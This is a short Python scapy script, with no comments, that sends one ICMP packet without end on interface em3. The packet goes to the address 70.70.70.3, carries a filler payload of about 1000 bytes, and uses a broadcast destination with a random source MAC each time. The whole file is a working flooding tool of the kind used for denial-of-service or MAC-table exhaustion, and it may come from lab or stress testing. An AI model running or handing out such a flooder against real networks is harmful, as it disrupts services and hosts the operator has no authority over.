#!/usr/bin/python

from scapy.all import *

dip="70.70.70.3"
payload="A"*496+"B"*500
packet=Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(dst=dip,id=100)/ICMP()/payload

while 1:
        sendp(packet, iface='em3')
